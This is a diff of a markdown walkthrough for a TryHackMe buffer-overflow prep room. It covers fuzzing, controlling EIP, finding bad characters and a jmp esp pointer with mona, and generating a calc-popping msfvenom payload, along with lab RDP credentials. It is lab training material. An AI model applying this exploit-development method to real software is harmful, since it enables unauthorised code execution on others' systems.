@@ -19,15 +19,13 @@ Thanks to Tib3rius for this awesome tryhackme room.
 
 Here is the link for all the scripts: [hum4nG0D/OSCP_Bufferoverflow_Prep](https://github.com/hum4nG0D/OSCP_Bufferovrflw_Prep)
 
-Connecting to the machine:
+I will take overflow1 from THM bufferoverflow room as an example. So fire up the machine and then connect. You will need to do `Immunity > Debug > restart > play` for each step.
 
 ```
 > xfreerdp /u:admin /p:password /cert:ignore /v:192.168.10.10
   
 > git clone https://github.com/hum4nG0D/OSCP_Bufferovrflw_Prep.git
 ```
-
-
 
 
 
@@ -38,8 +36,6 @@ Connecting to the machine:
 ```
 
 Press `Ctrl + C` after the application crushed. Note down the byte number. (Example: Crushed at 2000)
-
-
 
 
 
@@ -61,8 +57,6 @@ Find EIP normal pattern. (Example: EIP contains normal pattern : 0x42987857 (off
 
 
 
-
-
 ### 03 Controlling EIP
 
 ```c++
@@ -70,8 +64,6 @@ Find EIP normal pattern. (Example: EIP contains normal pattern : 0x42987857 (off
 ```
 
 You should see `424242` for EIP.
-
-
 
 
 
@@ -101,7 +93,7 @@ Running the script:
 > !mona compare -f C:\mona\oscp\bytearray.bin -a 0321FF88
 ```
 
-Generating byte array with bad characters removed. Update the script and run again util you see 'Unmodified' status in mona memory comparison results.
+Generating byte array with bad characters removed. Update the script and run again until you see 'Unmodified' status in mona memory comparison results.
 
 ```c++
 > !mona bytearray -b "\x00\x0d"
@@ -115,15 +107,19 @@ Generating byte array with bad characters removed. Update the script and run aga
 
 
 
-
-
 ### 05 Finding a Jump Point
+
+Replace the bad characters with what you find:
 
 ```c++
 > !mona jmp -r esp -cpb "\x00\x0d"
 ```
 
 Set the break point by entering the pointer address and pressing `F2`.
+
+![Break point](/assets/images/oscp_bufferoverflow/pointer.png)
+
+
 
 ```c++
 > ./05-pointer.py
@@ -133,9 +129,9 @@ If the pointer address stop at EIP. You are good to go.
 
 
 
-
-
 ### 06 Popping Calculator
+
+Again, don't forget to replace with the bad characters that you find:
 
 ```c++
 > msfvenom -p windows/exec CMD="C:\windows\system32\calc.exe" -b '\x00\x0d' -f c
